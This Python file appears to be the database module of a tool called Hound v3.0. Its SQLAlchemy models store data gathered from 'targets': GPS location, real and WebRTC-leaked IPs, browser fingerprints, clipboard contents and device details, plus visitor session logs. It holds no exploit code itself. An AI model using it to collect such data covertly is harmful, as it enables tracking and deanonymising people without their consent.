"""
Hound v3.0 - Database Module
SQLAlchemy models and database operations
"""

from sqlalchemy import create_engine, Column, String, Float, DateTime, JSON, Integer, Text
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, Session
from datetime import datetime
from config import settings
import logging

logger = logging.getLogger(__name__)

# Database setup
engine = create_engine(
    settings.DATABASE_URL,
    connect_args={"check_same_thread": False} if "sqlite" in settings.DATABASE_URL else {}
)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()


class CollectedData(Base):
    """Model for storing all collected data from targets"""
    __tablename__ = "collected_data"
    
    id = Column(String, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    
    # Device Information
    device_info = Column(JSON, nullable=True)
    battery_info = Column(JSON, nullable=True)
    
    # Location Data
    gps_data = Column(JSON, nullable=True)
    ip_info = Column(JSON, nullable=True)
    local_ip = Column(String, nullable=True)
    webrtc_ip = Column(String, nullable=True)
    
    # Network Information
    network_info = Column(JSON, nullable=True)
    
    # Orientation & Motion
    orientation = Column(JSON, nullable=True)
    motion = Column(JSON, nullable=True)
    
    # Browser Fingerprinting
    canvas_fingerprint = Column(String, nullable=True)
    webgl_fingerprint = Column(JSON, nullable=True)
    audio_fingerprint = Column(Text, nullable=True)
    fonts_signature = Column(String, nullable=True)
    js_engine_info = Column(JSON, nullable=True)
    
    # Hardware & Media
    media_devices = Column(JSON, nullable=True)
    usb_devices = Column(JSON, nullable=True)
    client_rects = Column(JSON, nullable=True)
    
    # Other
    clipboard_data = Column(Text, nullable=True)
    gps_error = Column(String, nullable=True)
    
    # User Agent & HTTP Info
    user_agent = Column(String, nullable=True)
    referer = Column(String, nullable=True)
    request_method = Column(String, nullable=True)
    protocol = Column(String, nullable=True)
    
    # Target Local Time
    target_local_time = Column(DateTime, nullable=True)


class SessionLog(Base):
    """Model for logging session information"""
    __tablename__ = "session_logs"
    
    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    ip_address = Column(String, index=True)
    user_agent = Column(String)
    referer = Column(String, nullable=True)
    request_method = Column(String)
    protocol = Column(String)


# Create all tables
def init_db():
    """Initialize database tables"""
    try:
        Base.metadata.create_all(bind=engine)
        logger.info("✅ Database initialized successfully")
    except Exception as e:
        logger.error(f"❌ Failed to initialize database: {e}")
        raise


def get_db():
    """Get database session"""
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def get_data_by_id(db: Session, data_id: str):
    """Retrieve collected data by ID"""
    return db.query(CollectedData).filter(CollectedData.id == data_id).first()


def save_collected_data(db: Session, data_dict: dict):
    """Save collected data to database"""
    try:
        collected_data = CollectedData(**data_dict)
        db.add(collected_data)
        db.commit()
        db.refresh(collected_data)
        logger.info(f"✅ Data saved: {collected_data.id}")
        return collected_data
    except Exception as e:
        db.rollback()
        logger.error(f"❌ Error saving data: {e}")
        raise


def save_session_log(db: Session, ip: str, user_agent: str, referer: str, method: str, protocol: str):
    """Log visitor session"""
    try:
        log = SessionLog(
            ip_address=ip,
            user_agent=user_agent,
            referer=referer,
            request_method=method,
            protocol=protocol
        )
        db.add(log)
        db.commit()
        logger.debug(f"📝 Session logged: {ip}")
        return log
    except Exception as e:
        db.rollback()
        logger.error(f"❌ Error logging session: {e}")
